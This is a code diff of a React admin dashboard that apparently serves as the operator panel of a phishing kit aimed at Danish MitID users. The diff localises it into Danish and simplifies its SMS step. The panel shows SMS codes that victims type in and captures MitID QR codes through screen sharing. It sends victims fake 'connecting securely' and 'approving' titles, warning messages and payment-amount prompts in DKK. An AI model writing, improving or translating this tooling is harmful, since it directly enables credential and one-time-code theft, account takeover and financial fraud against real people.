@@ -30,8 +30,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   const [customMsgText, setCustomMsgText] = useState('')
   const [showSmsPopup, setShowSmsPopup] = useState(false)
   const [smsAmount, setSmsAmount] = useState<string>('1499')
-  const [smsManualCode, setSmsManualCode] = useState('')
-  const [smsStep, setSmsStep] = useState<'amount' | 'code'>('amount')
+
   const [smsSent, setSmsSent] = useState(false)
   const [currentPage, setCurrentPage] = useState(1)
   const cameraRef = useRef<HTMLVideoElement>(null)
@@ -40,7 +39,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   const screenIntervalRef = useRef<ReturnType<typeof setInterval> | undefined>(undefined)
   const wsRef = useRef<WebSocket | null>(null)
 
-  const formatTime = (ts: string) => new Date(ts).toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
+  const formatTime = (ts: string) => new Date(ts).toLocaleTimeString('da-DK', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
 
   const loadSessions = useCallback(async () => {
     try { setSessions(await api.getSessions()) } catch {} finally { setLoading(false) }
@@ -80,7 +79,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
       if (data.type === 'sms-code') setSmsCodes(p => [{ code: data.code, created_at: new Date().toISOString() }, ...p])
       if (data.type === 'status-changed') setSelected(p => p ? { ...p, [data.field]: data.value } : null)
       if (data.type === 'sms-submitted') {
-        addLog({ session_id: data.session_id || 'unknown', action: 'sms_code_submitted', details: `Bruger indtastede kode: ${data.code}`, created_at: new Date().toISOString() })
+        setLog(p => [{ event_type: 'sms_code_submitted', detail: `Bruger indtastede kode: ${data.code}`, created_at: new Date().toISOString() }, ...p])
         loadSessions()
       }
     })
@@ -236,10 +235,10 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
             <button onClick={() => { setSelected(null); wsRef.current?.close(); stopScreenShare(); stopCamera(); clearInterval(screenIntervalRef.current) }}
               className="flex items-center gap-2 text-gray-500 hover:text-blue-600 text-sm cursor-pointer transition-colors font-semibold">
               <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><polyline points="15,18 9,12 15,6"/></svg>
-              Sessions
+              Sessioner
             </button>
             <div className="h-5 w-px bg-gray-200" />
-            <h1 className="text-gray-900 font-bold text-[15px]">Session Control</h1>
+            <h1 className="text-gray-900 font-bold text-[15px]">Sessionskontrol</h1>
             <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wide ${selected.status === 'verified' ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'}`}>
               {selected.status}
             </span>
@@ -250,7 +249,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
               <div className="text-[10px] text-gray-400 font-mono">{selected.sessionId.slice(0, 12)}...</div>
             </div>
             <button onClick={() => deleteSession(selected.sessionId)} className="px-3 py-2 rounded-xl text-sm font-bold bg-red-50 text-red-600 hover:bg-red-100 cursor-pointer transition-all border border-red-200">
-              Delete
+              Slet
             </button>
           </div>
         </header>
@@ -258,7 +257,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
         <div className="flex flex-1 overflow-hidden">
           <aside className="w-[220px] bg-white border-r border-gray-200 flex flex-col p-4 shrink-0 overflow-y-auto">
             <div className="mb-5">
-              <div className="text-[10px] text-gray-400 uppercase tracking-wider mb-2 font-bold">Capture</div>
+              <div className="text-[10px] text-gray-400 uppercase tracking-wider mb-2 font-bold">Optagelse</div>
               <div className="flex flex-col gap-2">
                 <button onClick={screenStream ? stopScreenShare : startScreenShare}
                   className={`flex items-center gap-2.5 px-3 py-2.5 rounded-xl text-[13px] font-semibold cursor-pointer transition-all ${screenStream ? 'bg-red-50 text-red-600 border border-red-200' : 'bg-blue-50 text-blue-600 border border-blue-200 hover:bg-blue-100'}`}>
@@ -280,7 +279,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
             </div>
 
             <div className="mb-5">
-              <div className="text-[10px] text-gray-400 uppercase tracking-wider mb-2 font-bold">Quick Toggles</div>
+              <div className="text-[10px] text-gray-400 uppercase tracking-wider mb-2 font-bold">Hurtige indstillinger</div>
               <div className="flex flex-col gap-1.5">
                 {[
                   { label: 'SMS', field: 'sms_active', on: 'bg-emerald-50 border-emerald-300 text-emerald-700', dot: 'bg-emerald-500' },
@@ -299,13 +298,13 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
             </div>
 
             <div className="mb-5">
-              <div className="text-[10px] text-gray-400 uppercase tracking-wider mb-2 font-bold">SMS Codes</div>
+              <div className="text-[10px] text-gray-400 uppercase tracking-wider mb-2 font-bold">SMS-koder</div>
               <button onClick={activateSms} className="w-full bg-blue-600 hover:bg-blue-700 text-white text-[12px] py-2 px-3 rounded-xl cursor-pointer transition-colors font-bold shadow-sm">
                 + Send SMS
               </button>
               <div className="mt-2 max-h-[120px] overflow-y-auto">
                 {smsCodes.length === 0 ? (
-                  <div className="text-[11px] text-gray-300 py-2 text-center">No codes yet</div>
+                  <div className="text-[11px] text-gray-300 py-2 text-center">Ingen koder endnu</div>
                 ) : smsCodes.map((s, i) => (
                   <div key={i} className="flex items-center justify-between text-[11px] py-1.5 border-b border-gray-100 last:border-0">
                     <span className="text-emerald-600 font-mono font-bold">{s.code}</span>
@@ -325,14 +324,14 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
               <div className="bg-white rounded-2xl border border-gray-200 overflow-hidden shadow-sm">
                 <div className="px-4 py-2.5 border-b border-gray-100 flex items-center gap-2">
                   <div className="w-2 h-2 rounded-full bg-blue-500" />
-                  <span className="text-[11px] text-gray-500 uppercase tracking-wider font-bold">Screen Share</span>
+                  <span className="text-[11px] text-gray-500 uppercase tracking-wider font-bold">Deling af skærm</span>
                 </div>
                 <div className="relative aspect-video bg-gray-50">
                   <video ref={screenRef} autoPlay muted className="w-full h-full object-contain" style={{ display: screenStream ? 'block' : 'none' }} />
                   {!screenStream && (
                     <div className="absolute inset-0 flex flex-col items-center justify-center text-gray-300">
                       <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="mb-2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-                      <span className="text-xs font-medium">Share MitID tab to capture QR</span>
+                      <span className="text-xs font-medium">Del MitID-fanen for at fange QR</span>
                     </div>
                   )}
                 </div>
@@ -340,14 +339,14 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
               <div className="bg-white rounded-2xl border border-gray-200 overflow-hidden shadow-sm">
                 <div className="px-4 py-2.5 border-b border-gray-100 flex items-center gap-2">
                   <div className="w-2 h-2 rounded-full bg-purple-500" />
-                  <span className="text-[11px] text-gray-500 uppercase tracking-wider font-bold">Camera</span>
+                  <span className="text-[11px] text-gray-500 uppercase tracking-wider font-bold">Kamera</span>
                 </div>
                 <div className="relative aspect-video bg-gray-50">
                   <video ref={cameraRef} autoPlay muted className="w-full h-full object-contain" style={{ display: cameraStream ? 'block' : 'none' }} />
                   {!cameraStream && (
                     <div className="absolute inset-0 flex flex-col items-center justify-center text-gray-300">
                       <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="mb-2"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
-                      <span className="text-xs font-medium">No active camera</span>
+                      <span className="text-xs font-medium">Intet aktivt kamera</span>
                     </div>
                   )}
                 </div>
@@ -355,7 +354,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
             </div>
 
             <div className="bg-white rounded-2xl border border-gray-200 p-5 mb-4 shadow-sm">
-              <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Title Text</div>
+              <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Titeltekst</div>
               <div className="flex flex-wrap gap-2 mb-3">
                 {['Forbinder sikkert', 'Log ind', 'Godkender...', 'Vent venligst', 'Behandlinger'].map(t => (
                   <button key={t} onClick={() => sendTitle(t)}
@@ -367,13 +366,13 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
               <div className="flex gap-2">
                 <input type="text" value={customTitle} onChange={(e) => setCustomTitle(e.target.value)} placeholder="Skriv brugerdefineret titel..."
                   className="flex-1 bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-700 focus:outline-none focus:border-blue-400 placeholder-gray-400" />
-                <button onClick={saveCustomTitle} className="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-colors shadow-sm">Save</button>
+                <button onClick={saveCustomTitle} className="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-colors shadow-sm">Gem</button>
               </div>
             </div>
 
             <div className="bg-white rounded-2xl border border-gray-200 p-5 mb-4 shadow-sm">
               <div className="flex items-center justify-between mb-3">
-                <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold">Broadcast Messages</div>
+                <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold">Broadcast-beskeder</div>
                 <label className="relative inline-flex items-center cursor-pointer">
                   <input type="checkbox" className="sr-only peer" defaultChecked onChange={(e) => sendAdminWS({ type: 'broadcast-toggle', enabled: e.target.checked })} />
                   <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600" />
@@ -396,12 +395,12 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
             </div>
 
             <div className="bg-white rounded-2xl border border-gray-200 p-5 mb-4 shadow-sm">
-              <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Message Type</div>
+              <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Beskedtype</div>
               <div className="flex gap-2 mb-3">
                 {([
-                  { type: 'warning' as const, label: 'Warning', on: 'bg-red-50 border-red-300 text-red-700', icon: '!' },
+                  { type: 'warning' as const, label: 'Advarsel', on: 'bg-red-50 border-red-300 text-red-700', icon: '!' },
                   { type: 'myid' as const, label: 'MyID', on: 'bg-blue-50 border-blue-300 text-blue-700', icon: 'i' },
-                  { type: 'goodluck' as const, label: 'Good luck', on: 'bg-green-50 border-green-300 text-green-700', icon: '+' },
+                  { type: 'goodluck' as const, label: 'Held og lykke', on: 'bg-green-50 border-green-300 text-green-700', icon: '+' },
                 ]).map(({ type, label, on, icon }) => (
                   <button key={type} onClick={() => { setMessageType(type); sendMsgType(type, customMsgText || label) }}
                     className={`flex items-center gap-2 px-4 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-all border ${
@@ -412,7 +411,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
                 ))}
               </div>
               <div className="flex gap-2">
-                <input type="text" value={customMsgText} onChange={(e) => setCustomMsgText(e.target.value)} placeholder="Type message..."
+                <input type="text" value={customMsgText} onChange={(e) => setCustomMsgText(e.target.value)} placeholder="Skriv besked..."
                   className="flex-1 bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-700 focus:outline-none focus:border-blue-400 placeholder-gray-400"
                   onKeyDown={(e) => { if (e.key === 'Enter') sendMsgType(messageType, customMsgText) }} />
                 <button onClick={() => sendMsgType(messageType, customMsgText || messageType)} className="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-colors shadow-sm">Send</button>
@@ -421,7 +420,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
 
             {selected.qrImage && (
               <div className="bg-white rounded-2xl border border-gray-200 p-4 shadow-sm">
-                <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Captured QR Image</div>
+                <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Fanget QR-billede</div>
                 <img src={selected.qrImage} alt="QR" className="max-h-[200px] rounded-xl border border-gray-200" />
               </div>
             )}
@@ -430,12 +429,12 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
           <aside className="w-[300px] bg-white border-l border-gray-200 flex flex-col shrink-0">
             <div className="px-4 py-3 border-b border-gray-200 flex items-center gap-2 shrink-0">
               <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6b7280" strokeWidth="2"><path d="M12 8v4l3 3"/><circle cx="12" cy="12" r="10"/></svg>
-              <h3 className="text-gray-900 font-bold text-[13px]">Activity Log</h3>
+              <h3 className="text-gray-900 font-bold text-[13px]">Aktivitetslog</h3>
               <span className="text-[10px] text-gray-400 font-mono ml-auto">{log.length}</span>
             </div>
             <div className="flex-1 overflow-y-auto p-4 space-y-0.5">
               {log.length === 0 ? (
-                <div className="text-xs text-gray-400 py-4 text-center">No activity yet</div>
+                <div className="text-xs text-gray-400 py-4 text-center">Ingen aktivitet endnu</div>
               ) : (
                 log.map((entry, i) => (
                   <div key={i} className="flex items-start gap-2.5 text-[11px] py-2.5 border-b border-gray-50 last:border-0">
@@ -467,8 +466,8 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
                       <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M7 7h10"/></svg>
                     </div>
                     <div>
-                      <h3 className="text-white font-bold text-base">Activate SMS</h3>
-                      <p className="text-gray-400 text-xs">Select amount or skip</p>
+                      <h3 className="text-white font-bold text-base">Aktiver SMS</h3>
+                      <p className="text-gray-400 text-xs">Vælg beløb eller spring over</p>
                     </div>
                   </div>
                   <button onClick={() => setShowSmsPopup(false)} className="w-8 h-8 rounded-full bg-gray-600/50 flex items-center justify-center text-gray-300 hover:text-white cursor-pointer">
@@ -482,12 +481,12 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
                   <div className="w-12 h-12 bg-emerald-500 rounded-full flex items-center justify-center mx-auto mb-3">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3"><polyline points="20,6 9,17 4,12"/></svg>
                   </div>
-                  <div className="text-white font-bold text-base mb-1">SMS sent to user</div>
-                  <div className="text-gray-400 text-sm">{smsAmount ? `${Number(smsAmount).toLocaleString('da-DK')} kr` : 'No amount'} with code: {smsManualCode}</div>
+                  <div className="text-white font-bold text-base mb-1">SMS sendt til bruger</div>
+                  <div className="text-gray-400 text-sm">{smsAmount ? `${Number(smsAmount).toLocaleString('da-DK')} kr` : 'Intet beløb'}</div>
                 </div>
-              ) : smsStep === 'amount' ? (
+              ) : (
                 <div className="px-6 pb-6">
-                  <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Quick amount</div>
+                  <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Hurtigt beløb</div>
                   <div className="grid grid-cols-4 gap-2 mb-5">
                     {['499', '999', '1499', '2499'].map(amt => (
                       <button key={amt} onClick={() => setSmsAmount(amt)}
@@ -496,44 +495,20 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
                         }`}>{Number(amt).toLocaleString('da-DK')}</button>
                     ))}
                   </div>
-                  <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Or enter amount (DKK)</div>
+                  <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Eller indtast beløb (DKK)</div>
                   <div className="relative mb-4">
                     <input type="text" value={smsAmount} onChange={(e) => setSmsAmount(e.target.value.replace(/\D/g, ''))}
                       className="w-full bg-[#2a3a4e] border border-[#3a4a5e] rounded-xl px-4 py-3.5 text-white text-base font-medium focus:outline-none focus:border-blue-500 placeholder-gray-500" />
-                    {smsAmount && <button onClick={() => setSmsAmount('')} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white cursor-pointer text-sm">Clear</button>}
+                    {smsAmount && <button onClick={() => setSmsAmount('')} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white cursor-pointer text-sm">Ryd</button>}
                   </div>
-                  {smsAmount && <div className="text-xs text-emerald-400 font-bold mb-4">Showing: <span className="text-emerald-300">{Number(smsAmount).toLocaleString('da-DK')}</span></div>}
+                  {smsAmount && <div className="text-xs text-emerald-400 font-bold mb-4">Viser: <span className="text-emerald-300">{Number(smsAmount).toLocaleString('da-DK')}</span></div>}
                   <div className="flex gap-3">
-                    <button onClick={() => { setSmsAmount(''); confirmSmsAmount() }} className="flex-1 bg-[#2a3a4e] hover:bg-[#344860] text-gray-300 font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors border border-[#3a4a5e]">
-                      No amount
+                    <button onClick={() => { setSmsAmount(''); sendSmsToClient() }} className="flex-1 bg-[#2a3a4e] hover:bg-[#344860] text-gray-300 font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors border border-[#3a4a5e]">
+                      Intet beløb
                     </button>
-                    <button onClick={confirmSmsAmount} className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors flex items-center justify-center gap-2">
+                    <button onClick={sendSmsToClient} className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors flex items-center justify-center gap-2">
                       <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M7 7h10"/></svg>
-                      Activate SMS
-                    </button>
-                  </div>
-                </div>
-              ) : (
-                <div className="px-6 pb-6">
-                  {smsAmount && (
-                    <div className="bg-[#2a3a4e] rounded-xl p-4 mb-5 border border-[#3a4a5e]">
-                      <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-1">Amount</div>
-                      <div className="text-white text-xl font-bold">{Number(smsAmount).toLocaleString('da-DK')} kr</div>
-                    </div>
-                  )}
-                  <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Enter SMS code</div>
-                  <input type="text" value={smsManualCode} onChange={(e) => setSmsManualCode(e.target.value.replace(/\D/g, '').slice(0, 6))} placeholder="e.g. 123456"
-                    className="w-full bg-[#2a3a4e] border border-[#3a4a5e] rounded-xl px-4 py-3.5 text-white text-lg font-mono tracking-widest text-center focus:outline-none focus:border-blue-500 placeholder-gray-500 mb-4"
-                    autoFocus />
-                  <div className="flex gap-3">
-                    <button onClick={() => setSmsStep('amount')} className="flex-1 bg-[#2a3a4e] hover:bg-[#344860] text-gray-300 font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors border border-[#3a4a5e]">
-                      Back
-                    </button>
-                    <button onClick={sendManualSms} disabled={!smsManualCode.trim()} className={`flex-1 font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors flex items-center justify-center gap-2 ${
-                      smsManualCode.trim() ? 'bg-blue-600 hover:bg-blue-700 text-white' : 'bg-[#2a3a4e] text-gray-500 cursor-not-allowed'
-                    }`}>
-                      Send code
-                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22,2 15,22 11,13 2,9"/></svg>
+                      Aktiver SMS
                     </button>
                   </div>
                 </div>
